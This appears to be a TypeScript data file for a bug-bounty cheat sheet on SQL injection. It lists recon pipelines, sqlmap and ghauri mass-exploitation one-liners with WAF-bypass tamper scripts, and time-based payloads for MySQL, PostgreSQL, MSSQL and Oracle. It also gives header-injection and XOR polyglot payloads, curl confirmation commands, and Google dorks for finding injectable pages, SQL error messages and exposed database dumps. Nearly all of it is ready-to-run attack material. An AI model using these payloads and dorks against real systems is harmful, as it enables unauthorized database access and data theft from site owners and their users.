export interface SQLInjectionCategory {
  category: string
  commands: { command: string; description: string }[]
}

export const sqlInjectionCategories: SQLInjectionCategory[] = [
  // =================== INTRODUCTION ==================
  {
    category: "Introduction",
    commands: [
      {
        command: "SQL Injection = vulnerability allowing attackers to manipulate SQL queries",
        description: "What is SQL Injection?",
      },
      {
        command: "Master SQLi Recon: Step-by-Step Guide for Bug Bounty Hunters",
        description: "Complete methodology for finding SQL injection vulnerabilities",
      },
    ],
  },

  // =================== STEP 1: RECON SUBDOMAINS ==================
  {
    category: "Step 1: Recon the Target Subdomains",
    commands: [
      {
        command: `subfinder -d example.com -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'`,
        description: "For single domain - filter subdomains by technology",
      },
      {
        command: `subfinder -dL subdomains.txt -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'`,
        description: "For multiple subdomains listed in file",
      },
    ],
  },

  // =================== STEP 2: DISCOVER SQLI ENDPOINTS ==================
  {
    category: "Step 2: Discovering Potential SQL Injection Endpoints",
    commands: [
      {
        command: `echo https://example.com | gau | uro | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep "=" >urls.txt`,
        description: "Using gau to find URLs with parameters",
      },
      {
        command: `echo https://example.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | uro | grep -E ".php|.asp|.aspx|.jspx|.jsp" >urls2.txt`,
        description: "Using Katana for deeper crawling (requires older version)",
      },
    ],
  },

  // =================== STEP 3: IDENTIFY SQL-PRONE URLs ==================
  {
    category: "Step 3: Identify SQL-Prone URLs",
    commands: [
      {
        command: `cat urls1.txt urls2.txt | gf sqli | uro > cleaned-sql.txt`,
        description: "Filter URLs containing SQL injection parameters using gf",
      },
    ],
  },

  // =================== AUTOMATED MASS TESTING ==================
  {
    category: "Automated 1: Using ghauri",
    commands: [
      {
        command: `ghauri -m cleaned-sql.txt --batch --dbs --level 3 --confirm`,
        description: "Automate SQLi testing with ghauri (recommended)",
      },
      {
        command: `subfinder -d example.com -all -silent | gau --threads 50 | uro | gf sqli > sql.txt; ghauri -m sql.txt --batch --dbs --level 3 --confirm`,
        description: "One-liner: subfinder + gau + gf + ghauri",
      },
    ],
  },
  {
    category: "Automated 2: Using sqlmap",
    commands: [
      {
        command: `sqlmap -m cleaned-sql.txt --batch --random-agent --tamper=space2comment --level=5 --risk=3 --drop-set-cookie --threads 10 --dbs`,
        description: "Automate SQLi testing with sqlmap (advanced options)",
      },
      {
        command: `subfinder -d example.com -all -silent | gau | urldedupe | gf sqli > sql.txt; sqlmap -m sql.txt --batch --dbs --risk 2 --level 5 --random-agent`,
        description: "One-liner: subfinder + gau + gf + sqlmap",
      },
    ],
  },

  // =================== MYSQL TIME-BASED ==================
  {
    category: "Time-Based 1: MySQL - Basic Delay",
    commands: [
      {
        command: `SELECT SLEEP(10);`,
        description: "Basic time-based delay in MySQL",
      },
      {
        command: `0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z`,
        description: "Inline injection with XOR logic and sleep",
      },
      {
        command: `1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(FLOOR(RAND()*2),(SELECT SLEEP(5))) AS x FROM information_schema.tables GROUP BY x) y);`,
        description: "Using benchmark with GROUP BY for delay (CPU-based)",
      },
      {
        command: `' OR IF(1=1, SLEEP(10), 0)-- -`,
        description: "Boolean logic delay with IF statement",
      },
    ],
  },

  // =================== POSTGRESQL TIME-BASED ==================
  {
    category: "Time-Based 2: PostgreSQL - Basic Delay",
    commands: [
      {
        command: `SELECT pg_sleep(10);`,
        description: "Basic time-based delay in PostgreSQL",
      },
      {
        command: `' OR (CASE WHEN ((LOCK_TIMESTAMP() - NOW()) < interval '0:0:10') THEN (SELECT '1' || pg_sleep(10)) ELSE '0' END)='1`,
        description: "Conditional delay with string concatenation",
      },
      {
        command: `' OR 1=1; SELECT pg_sleep(5);-- `,
        description: "More concise version with stacked query",
      },
      {
        command: `' OR (SELECT CASE WHEN (random() < 0.5) THEN pg_sleep(5) ELSE pg_sleep(0) END);--`,
        description: "Using random() for variability in delay",
      },
    ],
  },

  // =================== MSSQL TIME-BASED ==================
  {
    category: "Time-Based 3: Microsoft SQL Server - Basic Delay",
    commands: [
      {
        command: `WAITFOR DELAY '00:00:10';`,
        description: "Basic delay in MSSQL",
      },
      {
        command: `'; WAITFOR DELAY '00:00:05'; --`,
        description: "Inline SQLi payload with WAITFOR",
      },
      {
        command: `IF (1=1) WAITFOR DELAY '0:0:10';`,
        description: "Conditional delay with IF statement",
      },
      {
        command: `'; IF EXISTS (SELECT * FROM users) WAITFOR DELAY '00:00:07';--`,
        description: "Using IF EXISTS for more realism",
      },
    ],
  },

  // =================== ORACLE TIME-BASED ==================
  {
    category: "Time-Based 4: Oracle - Basic Delay",
    commands: [
      {
        command: `BEGIN DBMS_PIPE.RECEIVE_MESSAGE('a',10); END;`,
        description: "Basic time delay using DBMS_PIPE in Oracle",
      },
      {
        command: `' OR 1=1; BEGIN DBMS_PIPE.RECEIVE_MESSAGE('a',10); END;--`,
        description: "Inline SQLi payload with DBMS_PIPE",
      },
      {
        command: `DECLARE v INTEGER; BEGIN IF 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',10); END IF; END;`,
        description: "Conditional check with delay in PL/SQL block",
      },
    ],
  },

  // =================== HEADER-BASED SQLI ==================
  {
    category: "Header-Based SQLi Testing",
    commands: [
      {
        command: `User-Agent: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z`,
        description: "#1 Inject via User-Agent header (MySQL)",
      },
      {
        command: `X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z`,
        description: "#2 Inject via X-Forwarded-For header",
      },
      {
        command: `Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'"`,
        description: "#3 Inject via Referer header with subquery",
      },
    ],
  },

  // =================== CONFIRM WITH CURL ==================
  {
    category: "Confirm Time Delays with curl",
    commands: [
      {
        command: `time curl -s -H "User-Agent: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z" "https://target.com/vulnerable-endpoint"`,
        description: "#1 Confirm User-Agent injection with time measurement",
      },
      {
        command: `time curl -s -H "X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z" "https://target.com/vulnerable-endpoint"`,
        description: "#2 Confirm X-Forwarded-For injection",
      },
      {
        command: `time curl -s -H "Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'\"" "https://target.com/vulnerable-endpoint"`,
        description: "#3 Confirm Referer injection",
      },
    ],
  },

  // =================== XOR-BASED TECHNIQUES ==================
  {
    category: "Mastering XOR-Based SQL Injection",
    commands: [
      {
        command: `if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0))OR"*/`,
        description: "XOR polyglot - weaponized XOR logic for bypassing filters",
      },
      {
        command: `time curl "https://target.com/page.php?id=if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0))OR"*/"`,
        description: "Test XOR polyglot with curl and time measurement",
      },
      {
        command: "https://github.com/coffinxp/loxs/tree/main/payloads/sqli",
        description: "Download full list of advanced XOR-based SQLi payloads for all DBMS",
      },
    ],
  },

  // =================== GOOGLE DORKS: BY PARAMETERS ==================
  {
    category: "Google Dorks 1: Find URLs with Query Parameters",
    commands: [
      {
        command: `site:*.domain.com inurl:id=`,
        description: "#1 Find URLs with id parameter",
      },
      {
        command: `site:*.domain.com inurl=product.php?id=`,
        description: "#2 Find product pages with id parameter",
      },
      {
        command: `site:*.domain.com inurl=view.php?page=`,
        description: "#3 Find view pages with page parameter",
      },
      {
        command: `site:*.domain.com inurl=item.php?cat=`,
        description: "#4 Find item pages with cat parameter",
      },
    ],
  },

  // =================== GOOGLE DORKS: BY EXTENSION ==================
  {
    category: "Google Dorks 2: By File Extension",
    commands: [
      {
        command: `site:*.domain.com ext:php`,
        description: "#1 Find PHP files",
      },
      {
        command: `site:*.domain.com ext:asp`,
        description: "#2 Find ASP files",
      },
      {
        command: `site:*.domain.com ext:aspx`,
        description: "#3 Find ASPX files",
      },
      {
        command: `site:*.domain.com ext:jsp`,
        description: "#4 Find JSP files",
      },
      {
        command: `site:*.domain.com ext:jspx`,
        description: "#5 Find JSPX files",
      },
      {
        command: `site:*.domain.com ext:cfm`,
        description: "#6 Find CFM files",
      },
      {
        command: `site:*.domain.com ext:pl`,
        description: "#7 Find PL (Perl) files",
      },
    ],
  },

  // =================== GOOGLE DORKS: COMBINED ==================
  {
    category: "Google Dorks 3: Combine Extension + Parameters",
    commands: [
      {
        command: `site:*.domain.com ext:php inurl:id=`,
        description: "#1 PHP files with id parameter (high accuracy)",
      },
      {
        command: `site:*.domain.com ext:aspx inurl=productid=`,
        description: "#2 ASPX files with productid parameter",
      },
      {
        command: `site:*.domain.com ext:jsp inurl=categoryid=`,
        description: "#3 JSP files with categoryid parameter",
      },
    ],
  },

  // =================== ERROR-BASED FINGERPRINTING: MYSQL ==================
  {
    category: "Error-Based 1: MySQL Errors",
    commands: [
      {
        command: `site:*.domain.com intext:"You have an error in your SQL syntax"`,
        description: "#1 Classic MySQL syntax error",
      },
      {
        command: `site:*.domain.com intext:"mysql_fetch_array() expects parameter"`,
        description: "#2 MySQL function error",
      },
      {
        command: `site:*.domain.com intext:"mysql_num_rows() expects parameter"`,
        description: "#3 MySQL row count error",
      },
      {
        command: `site:*.domain.com intext:"supplied argument is not a valid MySQL result resource"`,
        description: "#4 Invalid MySQL result error",
      },
      {
        command: `site:*.domain.com intext:"Warning: mysql_"`,
        description: "#5 General MySQL warning",
      },
      {
        command: `site:*.domain.com intext:"Fatal error: Uncaught mysqli_sql_exception"`,
        description: "#6 MySQLi exception error",
      },
    ],
  },

  // =================== ERROR-BASED: MARIADB/PDO ==================
  {
    category: "Error-Based 2: MariaDB / PDO Errors",
    commands: [
      {
        command: `site:*.domain.com intext:"Fatal error: Call to undefined function mysql_connect()"`,
        description: "#1 Deprecated MySQL function error",
      },
      {
        command: `site:*.domain.com intext:"Warning: PDO::query()"`,
        description: "#2 PDO query warning",
      },
      {
        command: `site:*.domain.com intext:"SQLSTATE[HY000]"`,
        description: "#3 PDO SQLSTATE error",
      },
    ],
  },

  // =================== ERROR-BASED: POSTGRESQL ==================
  {
    category: "Error-Based 3: PostgreSQL Errors",
    commands: [
      {
        command: `site:*.domain.com intext:"pg_query(): Query failed"`,
        description: "#1 PostgreSQL query failed error",
      },
      {
        command: `site:*.domain.com intext:"Warning: pg_connect()"`,
        description: "#2 PostgreSQL connection warning",
      },
      {
        command: `site:*.domain.com intext:"PostgreSQL query failed: ERROR"`,
        description: "#3 PostgreSQL ERROR message",
      },
    ],
  },

  // =================== ERROR-BASED: MSSQL ==================
  {
    category: "Error-Based 4: Microsoft SQL Server Errors",
    commands: [
      {
        command: `site:*.domain.com intext:"Microsoft OLE DB Provider for SQL Server"`,
        description: "#1 OLE DB provider error",
      },
      {
        command: `site:*.domain.com intext:"Unclosed quotation mark after the character string"`,
        description: "#2 Unclosed quotation mark (classic MSSQL error)",
      },
      {
        command: `site:*.domain.com intext:"ADODB.Field error"`,
        description: "#3 ADODB field error",
      },
      {
        command: `site:*.domain.com intext:"80040e14"`,
        description: "#4 MSSQL error code 80040e14",
      },
    ],
  },

  // =================== ERROR-BASED: ORACLE ==================
  {
    category: "Error-Based 5: Oracle DB Errors",
    commands: [
      {
        command: `site:*.domain.com intext:"ORA-00933: SQL command not properly ended"`,
        description: "#1 Oracle ORA-00933 error",
      },
      {
        command: `site:*.domain.com intext:"ORA-01756: quoted string not properly terminated"`,
        description: "#2 Oracle ORA-01756 error",
      },
      {
        command: `site:*.domain.com intext:"Warning: oci_parse()"`,
        description: "#3 Oracle oci_parse warning",
      },
    ],
  },

  // =================== ERROR-BASED: GENERIC ==================
  {
    category: "Error-Based 6: DB2 / Informix / Generic",
    commands: [
      {
        command: `site:*.domain.com intext:"DB2 SQL error:"`,
        description: "#1 DB2 SQL error",
      },
      {
        command: `site:*.domain.com intext:"Syntax error in string in query expression"`,
        description: "#2 Informix syntax error",
      },
      {
        command: `site:*.domain.com intext:"Error Executing Database Query"`,
        description: "#3 Generic database query error",
      },
      {
        command: `site:*.domain.com intext:"Query failed:"`,
        description: "#4 Generic query failed",
      },
      {
        command: `site:*.domain.com intext:"unexpected end of SQL command"`,
        description: "#5 Unexpected end of SQL",
      },
      {
        command: `site:*.domain.com intext:"invalid SQL statement"`,
        description: "#6 Invalid SQL statement",
      },
      {
        command: `site:*.domain.com intext:"JDBC Exception"`,
        description: "#7 JDBC exception (Java DB connection)",
      },
    ],
  },

  // =================== EXPOSED DATABASE DUMPS ==================
  {
    category: "Find Exposed Database Dumps or Config Files",
    commands: [
      {
        command: `site:example.com ext:sql | ext:db | ext:dbf | ext:bak | ext:old | ext:backup`,
        description: "Find exposed database files by extension",
      },
      {
        command: `intitle:"index of" "db.sql"`,
        description: "Find database dumps in open directories",
      },
      {
        command: `intitle:"index of" "database.sql"`,
        description: "Variant with database.sql",
      },
      {
        command: `intitle:"index of" "dump.sql"`,
        description: "Find SQL dump files",
      },
    ],
  },

  // =================== RESOURCES ==================
  {
    category: "Resources to Master SQL Injection",
    commands: [
      {
        command: "https://www.youtube.com/watch?v=HD9201YJTfQ",
        description: "Video: Master SQL Injection from beginner to pro",
      },
      {
        command: "https://www.youtube.com/watch?v=x1z4GxDtEo0",
        description: "Video: Advanced SQL injection techniques",
      },
      {
        command: "https://infosecwriteups.com/waf-bypass-masterclass-using-sqlmap-with-proxychains-and-tamper-scripts-against-cloudflare-9d46b36bae94",
        description: "WAF Bypass Masterclass with sqlmap + tamper scripts",
      },
      {
        command: "https://github.com/coffinxp/scripts/blob/main/dorking.py",
        description: "CoffinXP Python script for automated Google dorking",
      },
      {
        command: "https://github.com/coffinxp/loxs",
        description: "Loxs tool - Automated SQL injection detection",
      },
    ],
  },

  // =================== TIPS ==================
  {
    category: "Tips for Bug Bounty Hunters",
    commands: [
      {
        command: "#1: Test both GET and POST requests",
        description: "Don't limit to GET - POST often has more vulnerabilities",
      },
      {
        command: "#2: Try tamper scripts like space2comment, between, or charencode with sqlmap",
        description: "Use tamper scripts to bypass WAF filters",
      },
      {
        command: "#3: Mix payloads into JSON bodies, XML, headers and cookies",
        description: "SQLi isn't just for URL parameters",
      },
      {
        command: "#4: Monitor 5xx errors, long delays, and unusual behavior",
        description: "Even without data extraction, time delays indicate vulnerability",
      },
      {
        command: "#5: Use a proxy like Burp to see responses in real-time",
        description: "Burp Suite helps analyze responses and craft precise payloads",
      },
    ],
  },
]

export const sqlInjectionTools = [
  {
    name: "ghauri",
    url: "https://github.com/coffinxp/ghauri",
    description: "Automatic SQL injection tool (recommended for bug bounty)",
  },
  {
    name: "sqlmap",
    url: "https://github.com/sqlmapproject/sqlmap",
    description: "Most popular automatic SQL injection tool",
  },
  {
    name: "gf (sqli pattern)",
    url: "https://github.com/coffinxp/GFpattren/blob/main/sqli.json",
    description: "Filter URLs for SQL injection parameters",
  },
  {
    name: "Loxs Tool",
    url: "https://github.com/coffinxp/loxs",
    description: "Automated SQL injection detection with no false positives",
  },
  {
    name: "WAF Bypass with sqlmap",
    url: "https://infosecwriteups.com/waf-bypass-masterclass-using-sqlmap-with-proxychains-and-tamper-scripts-against-cloudflare-9d46b36bae94",
    description: "Guide to bypassing WAF with tamper scripts",
  },
]
